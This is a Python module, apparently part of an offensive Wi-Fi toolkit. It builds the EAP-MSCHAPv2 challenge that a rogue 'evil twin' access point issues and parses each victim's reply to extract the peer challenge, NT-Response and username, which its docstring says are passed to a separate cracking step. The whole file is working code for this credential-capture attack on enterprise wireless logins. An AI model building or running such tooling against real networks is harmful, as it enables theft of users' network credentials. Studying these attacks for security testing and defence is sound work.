"""EAP-MSCHAPv2 (type 26) challenge/response framing for the rogue authenticator.

Build the server Challenge the evil twin issues and parse the peer's Response (PeerChallenge +
NT-Response + name). Spec only (draft-kamath-pppext-eap-mschapv2, RFC 2759): no credential cracking
here, that is ``crack.netntlm_format``.
"""
from __future__ import annotations

import struct
from dataclasses import dataclass
from typing import Optional

OPCODE_CHALLENGE = 1
OPCODE_RESPONSE = 2
OPCODE_SUCCESS = 3
OPCODE_FAILURE = 4

_CHALLENGE_LEN = 16
_RESPONSE_VALUE_LEN = 49        # PeerChallenge(16) + Reserved(8) + NT-Response(24) + Flags(1)
_NT_RESPONSE_OFFSET = 24
_NT_RESPONSE_LEN = 24


@dataclass(frozen=True)
class MschapV2Response:
    ms_id: int
    peer_challenge: bytes
    nt_response: bytes
    name: str


def challenge_request_data(ms_id: int, auth_challenge: bytes, name: bytes = b"wifit3") -> bytes:
    """The EAP-MSCHAPv2 Challenge packet (the bytes after the EAP type byte): OpCode=1, MS-ID,
    MS-Length, Value-Size=16, the 16-byte Authenticator Challenge, and the server name."""
    if len(auth_challenge) != _CHALLENGE_LEN:
        raise ValueError("authenticator challenge must be 16 bytes")
    ms_length = 4 + 1 + _CHALLENGE_LEN + len(name)
    return (struct.pack(">BBH", OPCODE_CHALLENGE, ms_id, ms_length)
            + bytes([_CHALLENGE_LEN]) + auth_challenge + name)


def parse_response(data: bytes) -> Optional[MschapV2Response]:
    """Decode an EAP-MSCHAPv2 Response packet (bytes after the EAP type). None when malformed."""
    if len(data) < 5 or data[0] != OPCODE_RESPONSE:
        return None
    ms_id = data[1]
    value_size = data[4]
    if value_size != _RESPONSE_VALUE_LEN or len(data) < 5 + _RESPONSE_VALUE_LEN:
        return None
    value = data[5:5 + _RESPONSE_VALUE_LEN]
    peer_challenge = value[:_CHALLENGE_LEN]
    nt_response = value[_NT_RESPONSE_OFFSET:_NT_RESPONSE_OFFSET + _NT_RESPONSE_LEN]
    name = data[5 + _RESPONSE_VALUE_LEN:].decode("utf-8", errors="replace")
    return MschapV2Response(ms_id=ms_id, peer_challenge=peer_challenge, nt_response=nt_response,
                            name=name)
